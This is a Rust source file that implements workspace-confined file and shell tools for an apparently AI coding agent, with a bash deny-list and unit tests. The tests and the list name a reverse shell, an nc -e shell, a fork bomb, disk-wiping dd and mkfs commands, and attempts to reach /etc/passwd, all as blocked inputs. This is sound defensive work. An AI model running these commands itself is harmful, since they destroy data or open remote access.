//! Built-in tools (read, write, edit, bash, grep, find, ls).

use std::fs::{self, File};
use std::io::Read;
use std::path::{Path, PathBuf};
use std::process::Command;
use std::time::{Duration, Instant};

use glob::glob;
use regex::Regex;
use serde_json::Value;
use walkdir::{DirEntry, WalkDir};

use crate::settings::ALL_TOOL_NAMES;

/// Result returned by [`run_tool`] — carries both the text output and an optional unified diff
/// generated locally for `edit` and `write` so the UI can render a diff block.
pub struct ToolResult {
    pub output: String,
    pub is_error: bool,
    /// Unified diff produced for `edit` / `write`; `None` for all other tools.
    pub diff: Option<String>,
}

const MAX_TOOL_OUTPUT_CHARS: usize = 120_000;
const READ_MAX_LINES: usize = 2000;
const GREP_MAX_MATCHES: usize = 100;
const FIND_MAX: usize = 1000;
const LS_MAX: usize = 500;
const BASH_MAX_SECONDS: f64 = 30.0;

fn err(s: impl Into<String>) -> String {
    s.into()
}

/// Resolve an existing `user_path` under `cwd`; rejects paths that escape `cwd`.
pub fn resolve_under_cwd(cwd: &Path, user_path: &str) -> Result<PathBuf, String> {
    let p = PathBuf::from(user_path);
    let abs = if p.is_absolute() { p } else { cwd.join(p) };
    let cwd_can = cwd.canonicalize().map_err(|e| e.to_string())?;
    let abs_can = abs.canonicalize().map_err(|e| e.to_string())?;
    if !abs_can.starts_with(&cwd_can) {
        return Err("Path escapes workspace root".to_string());
    }
    Ok(abs_can)
}

/// Resolve a path that may not exist yet, as long as its closest existing parent stays under `cwd`.
fn resolve_under_cwd_for_create(cwd: &Path, user_path: &str) -> Result<PathBuf, String> {
    let p = PathBuf::from(user_path);
    let abs = if p.is_absolute() { p } else { cwd.join(p) };
    let cwd_can = cwd.canonicalize().map_err(|e| e.to_string())?;

    let mut existing_parent = abs.as_path();
    while !existing_parent.exists() {
        existing_parent = existing_parent
            .parent()
            .ok_or_else(|| err("invalid path outside workspace"))?;
    }

    let parent_can = existing_parent.canonicalize().map_err(|e| e.to_string())?;
    if !parent_can.starts_with(&cwd_can) {
        return Err("Path escapes workspace root".to_string());
    }
    Ok(abs)
}

pub fn tool_definitions_json(enabled: &[bool; 7]) -> Vec<Value> {
    let mut out = Vec::new();
    for (i, name) in ALL_TOOL_NAMES.iter().enumerate() {
        if !enabled[i] {
            continue;
        }
        let def = match *name {
            "read" => serde_json::json!({
                "type": "function",
                "function": {
                    "name": "read",
                    "description": "Read a text file from the workspace. Optionally limit by line range.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "path": { "type": "string", "description": "File path relative to workspace or absolute under workspace" },
                            "offset": { "type": "integer", "description": "1-based start line (optional)" },
                            "limit": { "type": "integer", "description": "Max lines to read (optional)" }
                        },
                        "required": ["path"]
                    }
                }
            }),
            "write" => serde_json::json!({
                "type": "function",
                "function": {
                    "name": "write",
                    "description": "Write or overwrite a file (creates parent directories).",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "path": { "type": "string" },
                            "content": { "type": "string" }
                        },
                        "required": ["path", "content"]
                    }
                }
            }),
            "edit" => serde_json::json!({
                "type": "function",
                "function": {
                    "name": "edit",
                    "description": "Replace text in a file. Each oldText must match exactly once in the file.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "path": { "type": "string" },
                            "edits": {
                                "type": "array",
                                "items": {
                                    "type": "object",
                                    "properties": {
                                        "oldText": { "type": "string" },
                                        "newText": { "type": "string" }
                                    },
                                    "required": ["oldText", "newText"]
                                }
                            }
                        },
                        "required": ["path", "edits"]
                    }
                }
            }),
            "bash" => serde_json::json!({
                "type": "function",
                "function": {
                    "name": "bash",
                    "description": "Run a shell command in the workspace directory.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "command": { "type": "string" },
                            "timeout": { "type": "number", "description": "Timeout in seconds (optional)" }
                        },
                        "required": ["command"]
                    }
                }
            }),
            "grep" => serde_json::json!({
                "type": "function",
                "function": {
                    "name": "grep",
                    "description": "Search for a regex pattern in files under the workspace.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "pattern": { "type": "string" },
                            "path": { "type": "string", "description": "File or directory to search (optional)" },
                            "limit": { "type": "integer" }
                        },
                        "required": ["pattern"]
                    }
                }
            }),
            "find" => serde_json::json!({
                "type": "function",
                "function": {
                    "name": "find",
                    "description": "Find files matching a glob pattern.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "pattern": { "type": "string", "description": "Glob e.g. **/*.rs" },
                            "path": { "type": "string" },
                            "limit": { "type": "integer" }
                        },
                        "required": ["pattern"]
                    }
                }
            }),
            "ls" => serde_json::json!({
                "type": "function",
                "function": {
                    "name": "ls",
                    "description": "List directory entries.",
                    "parameters": {
                        "type": "object",
                        "properties": {
                            "path": { "type": "string" },
                            "limit": { "type": "integer" }
                        }
                    }
                }
            }),
            _ => continue,
        };
        out.push(def);
    }
    out
}

pub fn run_tool(
    cwd: &Path,
    name: &str,
    args: &Value,
    enabled: &[bool; 7],
) -> ToolResult {
    let idx = ALL_TOOL_NAMES.iter().position(|n| *n == name);
    let Some(i) = idx else {
        return ToolResult { output: format!("Unknown tool: {name}"), is_error: true, diff: None };
    };
    if !enabled[i] {
        return ToolResult { output: format!("Tool {name} is disabled in settings"), is_error: true, diff: None };
    }
    match name {
        "write" => tool_write(cwd, args),
        "edit"  => tool_edit(cwd, args),
        _ => {
            let result = match name {
                "read" => tool_read(cwd, args),
                "bash" => tool_bash(cwd, args),
                "grep" => tool_grep(cwd, args),
                "find" => tool_find(cwd, args),
                "ls"   => tool_ls(cwd, args),
                _      => Err(err("unknown tool")),
            };
            match result {
                Ok(output)  => ToolResult { output, is_error: false, diff: None },
                Err(output) => ToolResult { output, is_error: true,  diff: None },
            }
        }
    }
}

fn should_skip_search_entry(entry: &DirEntry) -> bool {
    let name = entry.file_name().to_string_lossy();
    matches!(name.as_ref(), ".git" | "target" | "node_modules")
}

fn is_reasonably_small_text_file(path: &Path) -> bool {
    const MAX_SEARCH_FILE_BYTES: u64 = 2 * 1024 * 1024;
    match fs::metadata(path) {
        Ok(meta) if meta.len() <= MAX_SEARCH_FILE_BYTES => {}
        _ => return false,
    }
    fs::read(path)
        .map(|bytes| !bytes.contains(&0))
        .unwrap_or(false)
}

fn truncate_out(s: String) -> String {
    if s.len() <= MAX_TOOL_OUTPUT_CHARS {
        s
    } else {
        format!(
            "{}\n\n[output truncated to {} chars]",
            &s[..MAX_TOOL_OUTPUT_CHARS],
            MAX_TOOL_OUTPUT_CHARS
        )
    }
}

/// Produce a minimal unified diff between `before` and `after` text.
/// Context lines: 3 (standard). Output is capped at 8 000 chars so it stays
/// lightweight in the UI — the full file is never stored twice.
fn make_unified_diff(path: &str, before: &str, after: &str) -> String {
    let before_lines: Vec<&str> = before.lines().collect();
    let after_lines: Vec<&str> = after.lines().collect();

    // Build a simple LCS-based diff: compute edit script line-by-line.
    let m = before_lines.len();
    let n = after_lines.len();

    // dp[i][j] = LCS length for before[..i] and after[..j]
    let mut dp = vec![vec![0u32; n + 1]; m + 1];
    for i in 1..=m {
        for j in 1..=n {
            dp[i][j] = if before_lines[i - 1] == after_lines[j - 1] {
                dp[i - 1][j - 1] + 1
            } else {
                dp[i - 1][j].max(dp[i][j - 1])
            };
        }
    }

    // Back-track to produce edit ops: (kind, line)
    // kind: ' ' = context, '-' = removed, '+' = added
    let mut ops: Vec<(char, &str)> = Vec::new();
    let (mut i, mut j) = (m, n);
    while i > 0 || j > 0 {
        if i > 0 && j > 0 && before_lines[i - 1] == after_lines[j - 1] {
            ops.push((' ', before_lines[i - 1]));
            i -= 1;
            j -= 1;
        } else if j > 0 && (i == 0 || dp[i][j - 1] >= dp[i - 1][j]) {
            ops.push(('+', after_lines[j - 1]));
            j -= 1;
        } else {
            ops.push(('-', before_lines[i - 1]));
            i -= 1;
        }
    }
    ops.reverse();

    // Render with 3 context lines, unified format
    const CTX: usize = 3;
    let total = ops.len();
    // Find ranges of changed lines
    let changed: Vec<usize> = ops
        .iter()
        .enumerate()
        .filter(|(_, (k, _))| *k != ' ')
        .map(|(i, _)| i)
        .collect();

    if changed.is_empty() {
        return String::new(); // no changes
    }

    // Group changed lines into hunks (within CTX*2+1 of each other)
    let mut hunks: Vec<(usize, usize)> = Vec::new();
    let mut hstart = changed[0].saturating_sub(CTX);
    let mut hend = (changed[0] + CTX + 1).min(total);
    for &ci in &changed[1..] {
        if ci.saturating_sub(CTX) <= hend {
            hend = (ci + CTX + 1).min(total);
        } else {
            hunks.push((hstart, hend));
            hstart = ci.saturating_sub(CTX);
            hend = (ci + CTX + 1).min(total);
        }
    }
    hunks.push((hstart, hend));

    let mut out = format!("--- a/{path}\n+++ b/{path}\n");

    // Walk ops once to assign line numbers in before/after for hunk headers
    let mut before_nums = Vec::with_capacity(ops.len());
    let mut after_nums  = Vec::with_capacity(ops.len());
    let (mut bl, mut al) = (1usize, 1usize);
    for (k, _) in &ops {
        before_nums.push(bl);
        after_nums.push(al);
        match k {
            ' ' => { bl += 1; al += 1; }
            '-' => { bl += 1; }
            '+' => { al += 1; }
            _ => {}
        }
    }

    for (hs, he) in hunks {
        // hunk header counts
        let hunk_before_start = before_nums[hs];
        let hunk_after_start  = after_nums[hs];
        let hunk_before_count = ops[hs..he].iter().filter(|(k,_)| *k != '+').count();
        let hunk_after_count  = ops[hs..he].iter().filter(|(k,_)| *k != '-').count();
        out.push_str(&format!(
            "@@ -{},{} +{},{} @@\n",
            hunk_before_start, hunk_before_count,
            hunk_after_start,  hunk_after_count,
        ));
        for (k, line) in &ops[hs..he] {
            out.push(*k);
            out.push_str(line);
            out.push('\n');
        }
        if out.len() > 8_000 {
            out.push_str("\n[diff truncated]\n");
            break;
        }
    }
    out
}

fn tool_read(cwd: &Path, args: &Value) -> Result<String, String> {
    let path = args
        .get("path")
        .or_else(|| args.get("file_path"))
        .and_then(|x| x.as_str())
        .ok_or_else(|| err("missing path"))?;
    let abs = resolve_under_cwd(cwd, path)?;
    let mut f = File::open(&abs).map_err(|e| e.to_string())?;
    let mut buf = String::new();
    f.read_to_string(&mut buf).map_err(|e| e.to_string())?;
    let lines: Vec<&str> = buf.lines().collect();
    let offset = args
        .get("offset")
        .and_then(|x| x.as_u64())
        .unwrap_or(1)
        .max(1) as usize;
    let limit = args
        .get("limit")
        .and_then(|x| x.as_u64())
        .map(|n| n as usize)
        .unwrap_or(READ_MAX_LINES)
        .min(READ_MAX_LINES);
    let start = offset.saturating_sub(1);
    let end = (start + limit).min(lines.len());
    let slice = if start < lines.len() {
        lines[start..end].join("\n")
    } else {
        String::new()
    };
    Ok(truncate_out(format!(
        "File: {}\nLines {}-{}\n---\n{}",
        abs.display(),
        offset,
        offset.saturating_add(limit).saturating_sub(1),
        slice
    )))
}

fn tool_write(cwd: &Path, args: &Value) -> ToolResult {
    let path = match args.get("path").and_then(|x| x.as_str()) {
        Some(p) => p,
        None => return ToolResult { output: err("missing path"), is_error: true, diff: None },
    };
    let content = match args.get("content").and_then(|x| x.as_str()) {
        Some(c) => c,
        None => return ToolResult { output: err("missing content"), is_error: true, diff: None },
    };
    let abs = match resolve_under_cwd_for_create(cwd, path) {
        Ok(p) => p,
        Err(e) => return ToolResult { output: e, is_error: true, diff: None },
    };
    // Read existing file for diff (empty string if new file).
    let before = fs::read_to_string(&abs).unwrap_or_default();
    if let Some(parent) = abs.parent() {
        if let Err(e) = fs::create_dir_all(parent) {
            return ToolResult { output: e.to_string(), is_error: true, diff: None };
        }
    }
    if let Err(e) = fs::write(&abs, content.as_bytes()) {
        return ToolResult { output: e.to_string(), is_error: true, diff: None };
    }
    let diff = make_unified_diff(path, &before, content);
    ToolResult {
        output: format!("Wrote {} bytes to {}", content.len(), abs.display()),
        is_error: false,
        diff: if diff.is_empty() { None } else { Some(diff) },
    }
}

fn tool_edit(cwd: &Path, args: &Value) -> ToolResult {
    let path = match args.get("path").and_then(|x| x.as_str()) {
        Some(p) => p,
        None => return ToolResult { output: err("missing path"), is_error: true, diff: None },
    };
    let abs = match resolve_under_cwd(cwd, path) {
        Ok(p) => p,
        Err(e) => return ToolResult { output: e, is_error: true, diff: None },
    };
    let before = match fs::read_to_string(&abs) {
        Ok(s) => s,
        Err(e) => return ToolResult { output: e.to_string(), is_error: true, diff: None },
    };
    let mut content = before.clone();
    let mut edits = Vec::new();
    if let Some(arr) = args.get("edits").and_then(|x| x.as_array()) {
        for e in arr {
            let old = e.get("oldText").and_then(|x| x.as_str());
            let new = e.get("newText").and_then(|x| x.as_str());
            if let (Some(o), Some(n)) = (old, new) {
                edits.push((o.to_string(), n.to_string()));
            }
        }
    }
    if edits.is_empty() {
        let old = args.get("oldText").and_then(|x| x.as_str());
        let new = args.get("newText").and_then(|x| x.as_str());
        if let (Some(o), Some(n)) = (old, new) {
            edits.push((o.to_string(), n.to_string()));
        }
    }
    if edits.is_empty() {
        return ToolResult { output: err("no edits"), is_error: true, diff: None };
    }
    for (old, _) in &edits {
        let count = content.matches(old.as_str()).count();
        if count != 1 {
            return ToolResult {
                output: err(format!("oldText must match exactly once in file, found {count} occurrences")),
                is_error: true,
                diff: None,
            };
        }
    }
    for (old, new) in edits {
        if let Some(idx) = content.find(old.as_str()) {
            content.replace_range(idx..idx + old.len(), &new);
        }
    }
    if let Err(e) = fs::write(&abs, &content) {
        return ToolResult { output: e.to_string(), is_error: true, diff: None };
    }
    let diff = make_unified_diff(path, &before, &content);
    ToolResult {
        output: format!("Edited {}", abs.display()),
        is_error: false,
        diff: if diff.is_empty() { None } else { Some(diff) },
    }
}

/// Deny-list patterns checked against the lowercased command string.
/// Each entry is a substring match — if the command contains it, the command is refused.
const DENIED_BASH_PATTERNS: &[&str] = &[
    // Destructive filesystem operations
    "rm -rf /",
    "rm -fr /",
    "rm -rf --no-preserve-root",
    // Privilege escalation
    "sudo ",
    "doas ",
    "su -c",
    "su root",
    "pkexec ",
    // Disk/partition destruction
    "mkfs",
    "dd if=",
    "fdisk ",
    "parted ",
    "wipefs ",
    // System-level danger
    "shutdown ",
    "reboot",
    "init 0",
    "init 6",
    "systemctl poweroff",
    "systemctl reboot",
    "halt",
    // Fork bombs and resource exhaustion
    ":(){ :",
    ".(){.|.",
    // Network exfiltration / reverse shells
    "/dev/tcp/",
    "/dev/udp/",
    "nc -e",
    "ncat -e",
    "bash -i >& /dev/tcp",
    // Crontab manipulation
    "crontab -r",
    // Kernel module loading
    "insmod ",
    "modprobe ",
    "rmmod ",
    // iptables flush (could lock out SSH)
    "iptables -f",
    "iptables --flush",
    // chmod 777 on root is almost always a mistake
    "chmod -r 777 /",
    "chmod 777 /",
    // Overwriting critical files
    "> /dev/sda",
    ">/dev/sda",
    "> /etc/passwd",
    ">/etc/passwd",
    "> /etc/shadow",
    ">/etc/shadow",
];

/// Validate a bash command against the deny-list. Returns `Ok(())` if allowed, `Err(reason)`
/// if the command matches a denied pattern.
fn validate_bash_command(cmd: &str) -> Result<(), String> {
    let lowered = cmd.to_ascii_lowercase();
    // Collapse multiple spaces so tricks like `sudo  cmd` still match.
    let normalized: String = lowered.split_whitespace().collect::<Vec<_>>().join(" ");
    for denied in DENIED_BASH_PATTERNS {
        if normalized.contains(denied) {
            return Err(format!("Refusing risky bash command containing: {denied}"));
        }
    }
    Ok(())
}

fn tool_bash(cwd: &Path, args: &Value) -> Result<String, String> {
    let cmd = args
        .get("command")
        .and_then(|x| x.as_str())
        .ok_or_else(|| err("missing command"))?;
    validate_bash_command(cmd)?;
    let timeout_s = args
        .get("timeout")
        .and_then(|x| x.as_f64().or_else(|| x.as_u64().map(|u| u as f64)))
        .unwrap_or(15.0)
        .clamp(0.1, BASH_MAX_SECONDS);
    let start = Instant::now();
    let mut child = if cfg!(unix) {
        Command::new("/bin/sh")
            .arg("-c")
            .arg(cmd)
            .current_dir(cwd)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| e.to_string())?
    } else {
        Command::new("cmd")
            .args(["/C", cmd])
            .current_dir(cwd)
            .stdout(std::process::Stdio::piped())
            .stderr(std::process::Stdio::piped())
            .spawn()
            .map_err(|e| e.to_string())?
    };
    let timeout = Some(Duration::from_secs_f64(timeout_s));
    let status = loop {
        if let Some(t) = timeout {
            if start.elapsed() > t {
                let _ = child.kill();
                return Ok(truncate_out(format!(
                    "[timeout after {}s]\n",
                    t.as_secs_f64()
                )));
            }
        }
        match child.try_wait() {
            Ok(Some(s)) => break s,
            Ok(None) => std::thread::sleep(Duration::from_millis(20)),
            Err(e) => return Err(e.to_string()),
        }
    };
    let mut out = String::new();
    if let Some(mut o) = child.stdout {
        let _ = o.read_to_string(&mut out);
    }
    if let Some(mut e) = child.stderr {
        let mut err = String::new();
        let _ = e.read_to_string(&mut err);
        if !err.is_empty() {
            if !out.is_empty() {
                out.push('\n');
            }
            out.push_str(&err);
        }
    }
    Ok(truncate_out(format!(
        "exit code: {}\n{}",
        status.code().unwrap_or(-1),
        out
    )))
}

fn tool_grep(cwd: &Path, args: &Value) -> Result<String, String> {
    let pattern = args
        .get("pattern")
        .and_then(|x| x.as_str())
        .ok_or_else(|| err("missing pattern"))?;
    let literal = args
        .get("literal")
        .and_then(|x| x.as_bool())
        .unwrap_or(false);
    let re = if literal {
        Regex::new(&regex::escape(pattern)).map_err(|e| e.to_string())?
    } else {
        Regex::new(pattern).map_err(|e| e.to_string())?
    };
    let search_root = args
        .get("path")
        .and_then(|x| x.as_str())
        .map(|p| resolve_under_cwd(cwd, p))
        .transpose()?
        .unwrap_or_else(|| cwd.to_path_buf());
    let limit = args
        .get("limit")
        .and_then(|x| x.as_u64())
        .unwrap_or(GREP_MAX_MATCHES as u64) as usize;
    let mut matches = 0usize;
    let mut out = String::new();
    if search_root.is_file() {
        let txt = fs::read_to_string(&search_root).map_err(|e| e.to_string())?;
        for (i, line) in txt.lines().enumerate() {
            if re.is_match(line) {
                matches += 1;
                let rel = search_root.strip_prefix(cwd).unwrap_or(&search_root);
                out.push_str(&format!("{}:{}:{}\n", rel.display(), i + 1, line));
                if matches >= limit {
                    break;
                }
            }
        }
    } else {
        'outer: for entry in WalkDir::new(&search_root)
            .into_iter()
            .filter_entry(|e| !should_skip_search_entry(e))
            .filter_map(|e| e.ok())
        {
            if !entry.file_type().is_file() {
                continue;
            }
            let p = entry.path();
            if !is_reasonably_small_text_file(p) {
                continue;
            }
            if let Ok(txt) = fs::read_to_string(p) {
                for (i, line) in txt.lines().enumerate() {
                    if re.is_match(line) {
                        matches += 1;
                        let rel = p.strip_prefix(cwd).unwrap_or(p);
                        out.push_str(&format!("{}:{}:{}\n", rel.display(), i + 1, line));
                        if matches >= limit {
                            break 'outer;
                        }
                    }
                }
            }
        }
    }
    if matches >= limit {
        out.push_str(&format!("\n[match limit {limit} reached]\n"));
    }
    Ok(truncate_out(if out.is_empty() {
        "No matches".to_string()
    } else {
        out
    }))
}

fn tool_find(cwd: &Path, args: &Value) -> Result<String, String> {
    let pattern = args
        .get("pattern")
        .and_then(|x| x.as_str())
        .ok_or_else(|| err("missing pattern"))?;
    let base = args
        .get("path")
        .and_then(|x| x.as_str())
        .map(|p| resolve_under_cwd(cwd, p))
        .transpose()?
        .unwrap_or_else(|| cwd.to_path_buf());
    let limit = args
        .get("limit")
        .and_then(|x| x.as_u64())
        .unwrap_or(FIND_MAX as u64) as usize;
    let glob_pat = format!("{}/{}", base.display(), pattern);
    let mut out = String::new();
    let mut n = 0usize;
    for entry in glob(&glob_pat).map_err(|e| e.to_string())? {
        let path = entry.map_err(|e| e.to_string())?;
        if path.components().any(|c| {
            matches!(
                c.as_os_str().to_string_lossy().as_ref(),
                ".git" | "target" | "node_modules"
            )
        }) {
            continue;
        }
        let rel = path.strip_prefix(cwd).unwrap_or(&path);
        out.push_str(&format!("{}\n", rel.display()));
        n += 1;
        if n >= limit {
            out.push_str(&format!("\n[limit {limit} reached]\n"));
            break;
        }
    }
    Ok(truncate_out(out))
}

fn tool_ls(cwd: &Path, args: &Value) -> Result<String, String> {
    let base = args
        .get("path")
        .and_then(|x| x.as_str())
        .map(|p| resolve_under_cwd(cwd, p))
        .transpose()?
        .unwrap_or_else(|| cwd.to_path_buf());
    let limit = args
        .get("limit")
        .and_then(|x| x.as_u64())
        .unwrap_or(LS_MAX as u64) as usize;
    let rd = fs::read_dir(&base).map_err(|e| e.to_string())?;
    let mut names: Vec<String> = rd
        .filter_map(|e| e.ok())
        .map(|e| e.file_name().to_string_lossy().into_owned())
        .collect();
    names.sort();
    let total = names.len();
    names.truncate(limit);
    let mut out = names.join("\n");
    if total > limit {
        out.push_str(&format!("\n[limit {limit} reached]\n"));
    }
    if out.is_empty() {
        out = "[empty directory]".to_string();
    }
    Ok(truncate_out(out))
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;
    use std::fs;
    use std::path::PathBuf;
    use std::time::{Duration, SystemTime, UNIX_EPOCH};

    fn temp_workspace(name: &str) -> PathBuf {
        let nanos = SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap_or_else(|_| Duration::from_secs(0))
            .as_nanos();
        let path = std::env::temp_dir().join(format!("oxi-tools-{name}-{nanos}"));
        fs::create_dir_all(&path).unwrap();
        path
    }

    fn all_enabled() -> [bool; 7] {
        [true; 7]
    }

    // ─── resolve_under_cwd ───────────────────────────────────────────────

    #[test]
    fn resolve_under_cwd_relative_path() {
        let cwd = temp_workspace("resolve-rel");
        fs::write(cwd.join("hello.txt"), "hi").unwrap();
        let res = resolve_under_cwd(&cwd, "hello.txt");
        assert!(res.is_ok());
        assert!(res.unwrap().ends_with("hello.txt"));
    }

    #[test]
    fn resolve_under_cwd_absolute_under_workspace() {
        let cwd = temp_workspace("resolve-abs");
        let file = cwd.join("sub").join("file.txt");
        fs::create_dir_all(file.parent().unwrap()).unwrap();
        fs::write(&file, "content").unwrap();
        let res = resolve_under_cwd(&cwd, file.to_str().unwrap());
        assert!(res.is_ok());
    }

    #[test]
    fn resolve_under_cwd_rejects_escape() {
        let cwd = temp_workspace("resolve-escape");
        let res = resolve_under_cwd(&cwd, "/etc/passwd");
        assert!(res.is_err());
    }

    #[test]
    fn resolve_under_cwd_rejects_dotdot_escape() {
        let cwd = temp_workspace("resolve-dotdot");
        let sibling = cwd.parent().unwrap().join(format!("sibling-{}", cwd.file_name().unwrap().to_string_lossy()));
        fs::create_dir_all(&sibling).unwrap();
        fs::write(sibling.join("secret.txt"), "x").unwrap();
        let rel = format!("../{}/secret.txt", sibling.file_name().unwrap().to_string_lossy());
        let res = resolve_under_cwd(&cwd, &rel);
        assert!(res.is_err());
    }

    // ─── validate_bash_command ───────────────────────────────────────────

    #[test]
    fn bash_allows_safe_commands() {
        assert!(validate_bash_command("ls -la").is_ok());
        assert!(validate_bash_command("cat foo.txt").is_ok());
        assert!(validate_bash_command("cargo build").is_ok());
        assert!(validate_bash_command("echo hello world").is_ok());
        assert!(validate_bash_command("git status").is_ok());
        assert!(validate_bash_command("find . -name '*.rs'").is_ok());
    }

    #[test]
    fn bash_denies_rm_rf_root() {
        assert!(validate_bash_command("rm -rf /").is_err());
        assert!(validate_bash_command("rm -fr /").is_err());
        assert!(validate_bash_command("rm -rf --no-preserve-root /").is_err());
    }

    #[test]
    fn bash_denies_sudo() {
        assert!(validate_bash_command("sudo apt install").is_err());
        assert!(validate_bash_command("doas cat /etc/shadow").is_err());
    }

    #[test]
    fn bash_denies_privilege_escalation() {
        assert!(validate_bash_command("su -c whoami").is_err());
        assert!(validate_bash_command("su root").is_err());
        assert!(validate_bash_command("pkexec bash").is_err());
    }

    #[test]
    fn bash_denies_disk_destruction() {
        assert!(validate_bash_command("mkfs.ext4 /dev/sda").is_err());
        assert!(validate_bash_command("dd if=/dev/zero of=/dev/sda").is_err());
        assert!(validate_bash_command("fdisk /dev/sda").is_err());
        assert!(validate_bash_command("wipefs -a /dev/sda").is_err());
    }

    #[test]
    fn bash_denies_system_shutdown() {
        assert!(validate_bash_command("shutdown -h now").is_err());
        assert!(validate_bash_command("reboot").is_err());
        assert!(validate_bash_command("init 0").is_err());
        assert!(validate_bash_command("systemctl poweroff").is_err());
        assert!(validate_bash_command("halt").is_err());
    }

    #[test]
    fn bash_denies_fork_bomb() {
        assert!(validate_bash_command(":(){ :|:& };:").is_err());
    }

    #[test]
    fn bash_denies_reverse_shells() {
        assert!(validate_bash_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1").is_err());
        assert!(validate_bash_command("nc -e /bin/sh 1.2.3.4 4444").is_err());
    }

    #[test]
    fn bash_denies_kernel_modules() {
        assert!(validate_bash_command("insmod evil.ko").is_err());
        assert!(validate_bash_command("modprobe evil").is_err());
        assert!(validate_bash_command("rmmod module").is_err());
    }

    #[test]
    fn bash_denies_overwriting_critical_files() {
        assert!(validate_bash_command("echo x > /etc/passwd").is_err());
        assert!(validate_bash_command("echo x > /etc/shadow").is_err());
        assert!(validate_bash_command("echo x > /dev/sda").is_err());
    }

    #[test]
    fn bash_denies_iptables_flush() {
        assert!(validate_bash_command("iptables -f").is_err());
        assert!(validate_bash_command("iptables --flush").is_err());
    }

    #[test]
    fn bash_normalizes_whitespace_for_deny() {
        // Extra spaces shouldn't bypass the deny list
        assert!(validate_bash_command("sudo  apt  install").is_err());
        assert!(validate_bash_command("rm  -rf  /").is_err());
    }

    // ─── tool_read ──────────────────────────────────────────────────────

    #[test]
    fn tool_read_basic() {
        let cwd = temp_workspace("read-basic");
        fs::write(cwd.join("test.txt"), "line1\nline2\nline3").unwrap();
        let res = run_tool(&cwd, "read", &json!({"path": "test.txt"}), &all_enabled());
        assert!(!res.is_error);
        assert!(res.output.contains("line1"));
        assert!(res.output.contains("line2"));
        assert!(res.output.contains("line3"));
    }

    #[test]
    fn tool_read_with_offset_and_limit() {
        let cwd = temp_workspace("read-offset");
        let content: String = (1..=20).map(|i| format!("line{i}")).collect::<Vec<_>>().join("\n");
        fs::write(cwd.join("data.txt"), &content).unwrap();
        let res = run_tool(
            &cwd,
            "read",
            &json!({"path": "data.txt", "offset": 5, "limit": 3}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.output.contains("line5"));
        assert!(res.output.contains("line7"));
        assert!(!res.output.contains("line8"));
    }

    #[test]
    fn tool_read_missing_file() {
        let cwd = temp_workspace("read-missing");
        let res = run_tool(&cwd, "read", &json!({"path": "nope.txt"}), &all_enabled());
        assert!(res.is_error);
    }

    #[test]
    fn tool_read_missing_path_arg() {
        let cwd = temp_workspace("read-no-arg");
        let res = run_tool(&cwd, "read", &json!({}), &all_enabled());
        assert!(res.is_error);
        assert!(res.output.contains("missing path"));
    }

    #[test]
    fn tool_read_rejects_path_escape() {
        let cwd = temp_workspace("read-escape");
        let res = run_tool(&cwd, "read", &json!({"path": "/etc/passwd"}), &all_enabled());
        assert!(res.is_error);
    }

    // ─── tool_write ─────────────────────────────────────────────────────

    #[test]
    fn tool_write_creates_file() {
        let cwd = temp_workspace("write-create");
        let res = run_tool(
            &cwd,
            "write",
            &json!({"path": "new.txt", "content": "hello world"}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.output.contains("Wrote"));
        assert_eq!(fs::read_to_string(cwd.join("new.txt")).unwrap(), "hello world");
    }

    #[test]
    fn tool_write_creates_parent_dirs() {
        let cwd = temp_workspace("write-dirs");
        let res = run_tool(
            &cwd,
            "write",
            &json!({"path": "a/b/c.txt", "content": "deep"}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert_eq!(fs::read_to_string(cwd.join("a/b/c.txt")).unwrap(), "deep");
    }

    #[test]
    fn tool_write_produces_diff() {
        let cwd = temp_workspace("write-diff");
        fs::write(cwd.join("existing.txt"), "old content").unwrap();
        let res = run_tool(
            &cwd,
            "write",
            &json!({"path": "existing.txt", "content": "new content"}),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.diff.is_some());
        let diff = res.diff.unwrap();
        assert!(diff.contains("-old content"));
        assert!(diff.contains("+new content"));
    }

    #[test]
    fn tool_write_missing_content() {
        let cwd = temp_workspace("write-no-content");
        let res = run_tool(
            &cwd,
            "write",
            &json!({"path": "x.txt"}),
            &all_enabled(),
        );
        assert!(res.is_error);
        assert!(res.output.contains("missing content"));
    }

    // ─── tool_edit ──────────────────────────────────────────────────────

    #[test]
    fn tool_edit_single_replacement() {
        let cwd = temp_workspace("edit-single");
        fs::write(cwd.join("code.rs"), "fn main() {}\n").unwrap();
        let res = run_tool(
            &cwd,
            "edit",
            &json!({
                "path": "code.rs",
                "edits": [{"oldText": "fn main() {}", "newText": "fn main() {\n    println!(\"hi\");\n}"}]
            }),
            &all_enabled(),
        );
        assert!(!res.is_error);
        assert!(res.diff.is_some());
        let content = fs::read_to_string(cwd.join("code.rs")).unwrap();
        assert!(content.contains("println"));
    }

    #[test]
    fn tool_edit_rejects_ambiguous_match() {
        let cwd = temp_workspace("edit-ambiguous");
        fs::write(cwd.join("dup.txt"), "hello hello").unwrap();
        let res = run_tool(
            &cwd,
            "edit",
            &json!({
                "path": "dup.txt",
                "edits": [{"oldText": "hello", "newText": "world"}]
            }),
            &all_enabled(),
        );
        assert!(res.is_error);
        assert!(res.output.contains("2 occurrences"));
    }

    #[test]
    fn tool_edit_rejects_no_match() {
        let cwd = temp_workspace("edit-no-match");
        fs::write(cwd.join("file.txt"), "content").unwrap();
        let res = run_tool(
            &cwd,
            "edit",
            &json!({
                "path": "file.txt",
                "edits": [{"oldText": "nonexistent", "newText": "new"}]
            }),
            &all_enabled(),
        );
        assert!(res.is_error);
        assert!(res.output.contains("0 occurrences"));
    }

    #[test]
    fn tool_edit_no_edits_array() {
        let cwd = temp_workspace("edit-no-edits");
        fs::write(cwd.join("file.txt"), "content").unwrap();
        let res = run_tool(
            &cwd,
            "edit",
            &json!({"path": "file.txt"}),
            &all_enabled(),
        );
